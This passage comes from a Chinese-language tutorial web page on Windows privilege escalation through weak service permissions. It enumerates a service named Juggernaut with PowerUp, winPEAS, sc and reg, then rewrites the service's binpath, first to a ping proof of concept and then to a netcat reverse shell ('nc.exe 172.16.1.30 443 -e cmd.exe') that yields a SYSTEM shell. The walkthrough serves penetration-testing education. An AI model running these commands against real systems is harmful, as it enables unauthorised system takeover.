-wuvc * -accepteula</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346504-329371872-5b20cbc633777d6919a4ee76b68a3801.png" width="637" height="293" class="img_ev3q"></p>
<p>如上图所示，仅一条命令，我们就发现当前用户拥有对 Juggernaut 服务的写入权限，同时一次性找到了它的所有权限！</p>
<p>接下来，我们再看另外几款自动化工具，它们将为我们完成所有这些工作。</p>
<blockquote>
<p>了解工具的工作原理非常重要，这就是为什么我总是先教手工方法，然后再演示如何使用工具。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32powerupwinpeas"><strong><div id="id3.2">3.2、PowerUp/winPEAS</div></strong><a href="#32powerupwinpeas" class="hash-link" aria-label="32powerupwinpeas的直接链接" title="32powerupwinpeas的直接链接">​</a></h4>
<p>有很多好用的后利用工具可以使用，但在本例中，我们将使用 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener noreferrer">PowerUp.ps1</a> 和 <a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener noreferrer">winPEASx64.exe</a>。</p>
<p>下载每个工具的副本后，将其传输到受害者机器上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184347025-1063045986-5582545e9036b0518f7834bcf7d590c8.png" width="466" height="271" class="img_ev3q"></p>
<p>【<strong>工具1</strong>】：我们先使用 PowerUp.ps1 脚本，因为它的输出精简可能会使我们更快取得胜利。就像这样：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">. .\PowerUp.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-AllChecks</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346674-129805545-41023f8524146a48b5bc0eb0f7e6e0fc.png" width="622" height="416" class="img_ev3q"></p>
<p>在这里，我们可以看到 PowerUp 正在查找易受攻击的服务，并发现了 Juggernaut 服务的权限较弱。</p>
<p>此外，PowerUp.ps1 还有内置的函数（AbuseFunction），可用来利用PowerUp 所发现的大多数错误配置或者特殊权限。【注：滥用功能将在<a href="#id6">第6节</a>展示。】</p>
<p>【<strong>工具2</strong>】：接下来我们使用 winPEAS 工具，虽然 winPEAS 的输出内容很多，但我们只需关注 <strong>Services Information</strong> 和 <strong>Modifiable Services</strong> 部分的信息即可。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346681-109690526-d9b5c152f75b4420957d4ac809664159.png" width="905" height="195" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346765-1774258325-da187fdd6546de9251b0d3b7730a6217.png" width="915" height="263" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4利用服务的弱权限"><strong><div id="id4">4、利用服务的弱权限</div></strong><a href="#4利用服务的弱权限" class="hash-link" aria-label="4利用服务的弱权限的直接链接" title="4利用服务的弱权限的直接链接">​</a></h2>
<p>现在，我们已经了解了寻找非标准服务和枚举服务权限的多种方法，接下来，就需要详细查询服务本身的设置信息，以了解需要做哪些更改。然后修改服务，使其在启动时执行我们指定的二进制文件，而不是预定的二进制文件。最后，我们将重启服务并获得 SYSTEM shell。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41收集服务信息"><strong><div id="id4.1">4.1、收集服务信息</div></strong><a href="#41收集服务信息" class="hash-link" aria-label="41收集服务信息的直接链接" title="41收集服务信息的直接链接">​</a></h4>
<p>我们最感兴趣的服务信息是：启动类型、启动身份、启动程序路径。而这些信息可以通过 cmd.exe 中的 sc 命令或 PowerShell 中的 Get-Service cmdlet 或注册表来查找。</p>
<p>示例如下：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg query &quot;HKLM\System\CurrentControlSet\Services\Juggernaut&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346666-95369718-9e4a9217eb2fcfd7271bb7c0a285fa4d.png" width="748" height="166" class="img_ev3q"></p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc qc Juggernaut</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346558-90025802-8a9baa7515cc251a07f7f0238848d391.png" width="610" height="244" class="img_ev3q"></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WmiObject win32_service | ?{$_.Name -like &#x27;Juggernaut&#x27;} | select Name, DisplayName, StartMode, State, PathName, StartName</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346792-761826499-48951fc08c5687feaaa550733b40fc45.png" width="1024" height="203" class="img_ev3q"></p>
<p>上面这三条命令都返回了相同的关键信息：StartMode、PathName、StartName。</p>
<p>可以看到 StartName 显示的是 LocalSystem，这意味着该服务是以 SYSTEM 的身份执行的。而如果 StartName 显示的不是 LocalSystem，那我们就需要修改该字段为此值，以确保该服务就是以 SYSTEM 的身份执行的。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42修改服务启动程序路径---poc"><strong><div id="id4.2">4.2、修改服务启动程序路径 - POC</div></strong><a href="#42修改服务启动程序路径---poc" class="hash-link" aria-label="42修改服务启动程序路径---poc的直接链接" title="42修改服务启动程序路径---poc的直接链接">​</a></h4>
<p>关于 binpath 的有趣之处在于，我们可以往其中放入一条命令来执行，而这也为我们在启动服务时利用它来生成反向 shell 提供了机会。</p>
<p>让我们从 POC 开始，使用以下命令编辑 binpath 来 ping 攻击者的机器：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc config Juggernaut binpath= &quot;ping 172.16.1.30&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346591-1258778924-d8e6c9a71ab595e362a704f7469d9a0f.png" width="485" height="308" class="img_ev3q"></p>
<blockquote>
<p>注意：binpath=后面的空格必须要存在。</p>
</blockquote>
<p>现在，我们回到攻击者的机器上，启动 tcpdump 以捕获 ICMP 请求。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346793-806627187-d2c119e6557ac60f473eeeb59a20a2ae.png" width="811" height="232" class="img_ev3q"></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tcpdump -i eth0 icmp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在 tcpdump 启动之后，回到受害者机器启动服务：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc start Juggernaut</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">::或 net start &quot;Juggernaut&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>或：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Start-Service Juggernaut</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当启动服务后，会发现我们当前的 shell 被挂了起来。再次回到攻击机，我们看到 tcpdump 捕获到了 ICMP 请求包！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184348456-2039488913-82590e6da75a4d32cc2bbd23ab255d4f.png" width="740" height="218" class="img_ev3q"></p>
<p>Crazy！这意味着服务运行了我们指定的命令。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43修改服务启动程序路径---exp"><strong><div id="id4.3">4.3、修改服务启动程序路径 - EXP</div></strong><a href="#43修改服务启动程序路径---exp" class="hash-link" aria-label="43修改服务启动程序路径---exp的直接链接" title="43修改服务启动程序路径---exp的直接链接">​</a></h4>
<p>接下来，我们要做的就是将 binpath 修改为恶意程序的路径。为此，可以使用 msfvenom 制作一个恶意程序，然后修改服务的 binpath 以执行我们的程序，而不是实际的服务程序。不过，本节我们打算换个思路，使用 netcat 去获得 SYSTEM shell。</p>
<p>首先将 nc.exe 的副本下载并传输到受害者机器上。</p>
<blockquote>
<p>Kali在 <code>/usr/usr/share/windows-resources/binaries/directory</code> 目录中拥有 nc.exe 的副本。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346586-1324155671-f121c62bc3022223cbe3df25bd52de53.png" width="544" height="325" class="img_ev3q"></p>
<p>然后使用以下命令来修改 BinPath：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc config Juggernaut binPath= &quot;C:\temp\nc.exe 172.16.1.30 443 -e C:\windows\system32\cmd.exe&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346674-2122750206-a335166aee50dbb03371ec43380619f2.png" width="828" height="310" class="img_ev3q"></p>
<p>最后就是在攻击机的 443 端口上启动 netcat 监听器，然后启动服务。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc start Juggernaut</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当 shell 被挂起的时候，说明服务程序已经运行起来了。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAP0AAABKCAIAAAD/mMVmAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAAA+HSURBVHhe7Z1bVFNJusd9n9Xr9HEEaQi3cAk0NhcBaUNGuahIw4DYaoN3G7VF0VZU8N6KIto2ogcRAypiCBASLnINt0jCpRMISbgTAq6Z8zJnZtbMeTjrPMy8zFR2bTZQZEdAYZFtfeu3XJXvq9Su/dV/VyqhtntVY2PjKmzYPiUTCoVkCRu2T9HeTfRjMJ8CpOKhITEMhqmQioeGxDAYpkIqHhoSw2CYCql4aEgMg2EqpOKhITEMhqmQioeGxDAYpkIqHhoSw2CYCql4aEgMg2EqpOKhITFL5F+rVmGYDTLii4NUPDQkZokgOcIwjz61YmSoBxn3hUIqHhoSs0RgaurrJNVVpRiGAQcXFOTtjWMjvcjQLwhS8dCQmCVCpaa8rKhCIsQwCTi4hS+fgbKyu00/2oeM/vwhFQ8NiS2Cyf6aokLxoAH1LxuU7kFqGuolzdIqDGOAg5vPf/K6KB+81Kg7DHoNIoB5QioeGhJbBJOanAQO96ZMi/iXjZm6B6lRtDd2dbRgmAEcXDDfFxY+q30jAp7hQeXEuA7RwHwgFQ8NiU2hUZVePhjq6WizxtrOjZdwsbTLzEWmab4U6HkwbwD1GzFI7yZdzFWOo/6PCKJ7kBowKwzoupYUbWV60vlsmQb1L5SFtqMRnty83tdoX3l5781Wz6lgodDlAQ5uWWmhsPhFTbWoQy4FzsVN+aTioSExAp2u+JC309en+G90et24rr7kwb0KzdQVpn/z87cBQXE/NY9Nv2VS8/g7DveWqSl/rCDOLiilTY/6PwYa+dNzN4ub5+oepAYsBEF2lo5h/k42N6VlBPUvlMW201ub4sdOyBlG/TSM9mi7qspy7ou61PPyLzt0eYCDW1khFJcLpA0VnYqmJdO9vubaRuuQ240GxA/pz4lnffYfdrF83Uy/pik1wPMQf9aUPya8wON4Olt9vsbW3ZPjuW7r7dapC0MvK0mLCnC1Y9mzNyb8VKczXlRjBTs9og8fC/Nw8+CdTk+O8mW7BRwq7AUh9ct4VlRqxokt3h6ONuyv9+bI4Jebvm7Budh1DnN1r5M9Td0R6OHi7Orq4h2yO12imITHnVC3809Er3dk2dm5+oQkZknMfy2ZUD5Pi12PtkN7XjpN0Yktfu7uLiyWs1fkOb6K/JTTvEnjeTpYbb4lEV+LCvR0sLEKz1LrzOXn/WjqU75ixeeOGcsgP7bcq7XEeGk70rk2cdkjRDVDN/98TIB/gJ+38xprz03xiafyWoyKofObHBfa/huPa7f1zPWk3VE7tgd4+Wy/XQd/b6HLA00/zeZh7uAule4ne+5EWAdcpR0D3ZBcVNP+65SSSCb7Hu3h8NLnTPmm5nutPGMzm3tCpNK8G23m7/Ncd/zVMFHT1mu/oFctSXK333ZdNtSaGW4b/1xN5Mt6bVDiq071O30bP96FFXNfTel1WApTsz8l42UZTI20LDnIJTZTZTyoRttYUKEg0zQsTvR24J4vadNPaIfevsgvbzV9bZNoqpM97GPuzW0HYPJzbEJd36Yyjv2oLD3akZ1YQv34oG29FMD29tuWlK8ayNnjHFcwTL5lsZ+H89D9eGtWpB33ghjk9t1w5aVg14QC4rql89OMC3E4k/03jostL1msBoOuFv/g7rgvj+gPXR5o+klAl4fl071Blsq1Dr2vnFrYzBdN40X/L48UDM72mzgfffXlDTZxud3wpaHhTIDX95IxY037yAyNAYyoj++PIsNE1+No67inPbPz1a8v2e/iGC8YnW4QpuZMQnT07nOCepCaJml6BNtre2pusUI3M0E9hQl27okv4djMA63i7mY7zrY57Rh5j17HW+6GWkU/6pryAN2s/y3nkGgIhJrFfOHUFLiUuh97dZTDSZLAnveVHHHyOlk8bsZPMy7ES5P9n33cmxvXxvwyRLx3mll5WNm6n+y9s93cfA8SpB4zNU6T6uxdHN7tt7PeaOJ8Rl98z17t5B3I5W4wEvSVp/dh4eh8dW+oTfa1jno6ON0gTM3B2G9iDl4payBSo22V5l04Hsf1cnIMiDtXqiS6NN56N2wN92odbGdeGLqb+RfRdghMjZNuoPHnlIStW7aERkTwfFiro7M7pz4VgW78WXtyRqcrkyyh7g1y/i7nwNPF/Yb+SZ3glJ/jd/wOY3/o/DTjQhzOZP/R466NeUDoni4PK1v37/S117hrQ+9IJxA/ZFhwxnu11bpE8QzlTaFpvLAeTPkzL3qwamch56OvSgu03fXs12kPwTx1PybYy3bZXzo13xuUApiaU7eflM5NzVB9ZqQt+1ABoQ9Vwe4vOEdf6Yk3LoxZ7RgxcV5DBUdcHXZkSY11xlszw6xQ3ZMynYWJduZFr/CwEzgX4zxNr6cJefp2DocXFhoetvXwHaF2anFo2k8zLgQm+0+je9o8mNe96Twso+4ndDrBIW/njcn8au2YbmKwWfLg4uOGqd0Rw0Unvf7zt18eFpnQPfisePgtZ1NG+/S8OF55bB079lmP9p2hR92jJM5f23aT67Tx6OsOsATUaBvyhC3GtaBZ3a91jLxS26eZHK7PinVyO/iM+AKtbn303QZnlzmpqat4eKOg4a0ezGeDdTP1OiDY5+nAuyBsGRnX9Mue80ub4bVEg7LhSfoLqWJuOwAT56V7GPeFe2IJ0I1u5O0v8R6rt96TvVf3pvJDh7IhP0uiUE1MaPokKeH2bolCJeHXiI+5eh4vMjY+WJmxnWVN6knbdiWQcyh/ao1OQe83NS4wtADd0+aBrp9G6PKwnLoHaJQlaQdCPBzWrra2dQmKSeLLqBSABWLP8Cjd6l/TcN7PK/HF9JQ/Liv+MfRLR1tHZ9egxBzy+6i+VXAhaoObrb2zq8/vdlwWysBni1nd23hF7or0cbCzY/lEnys3/pgA2tFpK7Lzpb+iqVFUl985vN3f1Y7l6O65bnN8mhhkk+yPquXxkW0+9jZrv3DzCzlyXzRg5vccQ2fNvYPbfB1MtWPyvHql93YGujt5rvMK+n3yo8z93O2XZcYJDP4esvpzG6d1fvF86hdh2nZoMLRX3E4I82Hb21ixPDYeyCynOq9vvbPH32PDtqi4nfuunwplTelppCYtgmNlZb3Geq0N2yfkaHYV1Dqd3+S40PefRve0eaDtpxGaPCyz7hfPZM8vcZyQTMUMiXwoM/Nrgo+YGkYx3jfU30smTa/qFp3i2XHT5VpaP/SsMCxG92B6ULXV6Ra8YDUD1v1imNT8HOu0+Tb5Qa3VVp3hsULvd2np/NQbVxQWpPuPjkb66HSmhPjNwRRY9zQoG+5+G+zpxDb+3Y3txY0+/6KJ+E5P51+JfMq6fw9Y9wwG654WmBoMg8G6NwGSIwzzwLo3TZ9aAVJT+PJZPv8J+LestLCyQgg8GGZQLnrNEN1/rH35sB35QI+8vRGk5nVRfmHhM2HxC3G5ALyci/jhDzuiCPsmMurgDdGcChaKJDf1ePKNQjHqZwzVVWVM0P1i96WgUO2MjfQqu9tAamrfiGqqRdKGClCmp7Lg9DfbDmbUoX4aGiqqRfwnd64/EVXOy7/s1N3fuy3mdFE96mcSbS01S6t70/vOjazo/eu3pL0adQdITYdc2qloAgV6pIIfw3n777cbyw2P9wdHXixSGMtNVVcig+MzZEQ1RU3W2T0RERFbt2ziBodF709MeiCSmvF3ycvzUnZFbObxeJsiD1x63dwMj/UqJSrsd8HRV54XpO6KAKXg2NsNIASOy9uRnJa0d9d3OyPCtuy8+rqeqN8szTkRuzUkBLSzKezbM1l1cmNnaPvZ/vRsVEjYpmAuNzgkLCQsfMfVcvPnbsGAqW3pdE+773zl718HGRkeVILUvI8OyVmuL3mfnjxvr2/45XIt4W+6Ee69+34PKGtq7sX4hqcIVKCsKkndErAvV9pvxq/raLwV4R9+okjWMdBbnXMgaONxvrEOEapJ3ewfzItOeiLrzor3352rgsf9yndLskDeAcqCHzasP/AY3jeok0tqZe2g0Ft3Y8d6/8SXCqIRmn4SqHN3+4acre0jXzIYML5LpHu6feeWsX99YlwH8vI+Zt6np3qe4My78mbMWFa33+I57nw4CMrDL496eSWV9xL1e4qPuPmcfD1qxj9SeWmj484c4w3/gLG6M0E+35cPG8ug2ea0QJbXodJ+jWFUKsoTdI8C5+zj/hTsEPugn3jvNKNNGeH2v89WEC9p+knwse57tAiW7L5yk/vO8f51C9y/jqEgFQ8NiaHg/esWvn8dQ0EqHhoSI6Ddd473rxNY0v51DAWpeGhIzIi5fed4/7o5/wrcv46hIBUPDYlhpmHE/nUMBal4aEgMQ8GM/esYClLx0JAYZgZM2L+OoSAVDw2JYTBMhVQ8NCQG+Oyz35gEqYbBWBak4qEhMQAidwqkGgZjWZCKh4bEAIjcKZBqi+API73/raW2HmAwywqpeGhIDIDInQKpNn+A3P9aI/r/9Gv/WrXq76/yxscW/6gWDGbRkIqHhsQAiNwpkGrvZabcKf6QeVPdKzcsaj8dBvMhkIqHhsQAiNwpkGp0mJQ7xd/27n6Xfu3Pedl/L8z73yL+svEnuRTpJ+ZTg1Q8NCQGQOROgVSbC1i7/9/Du4jQVwj/k/vwwx+AirFoSMVDQ2IARO4USDWTgLW7oezVn1LP/tPPG1Ee5C+xUUOnTwydPjl64azhWurET5eXB2X+f334A1AxFg2peGhIDIDInQKpRgdYu3cqmqqrSpUP7v7x2JF/eLjP1P3AyWP5z3KeFzw1f/f3UlBXK/7AB6BiLBpS8dCQGACROwVSzQwGvbZH+bal6Y2kXAD0/fb65ckDCf9wM/6H3f0njubnPykXFVVXls7j7u+PTLus7kMegIqxaEjFQ0NiAETuFEg180yM63Sarq7OlmZpdVVFyeui/Ly8x22XL9ZdvwR0D0Qva62dx93fHx/Vr7JFPwAVY9GQioeGxACI3CmQau9l0qAbGVLpNJ3dna3tbxvqayUV4uJXhfzCQj7QPRD9Mjxl1iSLvjEZY9GQioeGxACI3CmQavMEzKzgy+7QgHLmBVBfK4YP4F3qp8zSgef7TxBS8dCQGACROwVSbaEgFwAA6B5IEKmGwSwRpOKhITEAIncKpNqioS4AvN7ALCek4qEhseUEXAB4vYFZNkjFQ0NiGAxTIRUPDYlhMEyFVDw0JIbBMBVS8dCQGAbDVEjFQ0NiGAxTIRUPDYlhMEyFVDw0JIbBMBVS8dCQGAbDVEjFQ0NiGAxTIRUPDYlhMEyFVDw2bJ+i3bp1iyxhw/ZpWGJi4r8Bo2xvz0ye1M8AAAAASUVORK5CYII=" width="253" height="74" class="img_ev3q"></p>
